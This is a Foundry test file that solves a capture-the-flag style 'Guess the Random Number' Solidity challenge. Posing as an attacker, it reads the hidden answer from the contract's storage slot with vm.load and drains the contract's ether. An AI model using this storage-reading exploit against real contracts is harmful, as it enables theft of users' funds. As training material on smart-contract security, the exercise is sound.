// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployGuessTheRandomNumberScript} from "@script/lotteries/3_DeployGuessTheRandomNumber.s.sol";
import {GuessTheRandomNumberChallenge} from "@main/lotteries/GuessTheRandomNumber.sol";

contract GuessTheRandomNumberTest is Test, DeployGuessTheRandomNumberScript {
    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 2 ether);


        guesstherandomnumberChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);
        // string[] memory inputs = new string[](4);
        // inputs[0] = "cast";
        // inputs[1] = "storage";
        // inputs[2] = "0x8464135c8f25da09e49bc8782676a84730c318bc";
        // inputs[3] = "0";

        // bytes memory res = vm.ffi(inputs);
        // bytes32 output = abi.decode(res, (bytes32));

        // uint8 answer = uint8(
        //     uint256(
        //         output
        //     )
        // );
        assertEq(guesstherandomnumberChallenge.isComplete(), false);
        assertEq(address(guesstherandomnumberChallenge).balance, 1 ether);
        uint8 answer = uint8(uint256(vm.load(address(guesstherandomnumberChallenge), 0)));
        guesstherandomnumberChallenge.guess{value: 1 ether}(answer);
        assertEq(guesstherandomnumberChallenge.isComplete(), true);
        assertEq(address(guesstherandomnumberChallenge).balance, 0 ether);

        vm.stopPrank();
    }
}
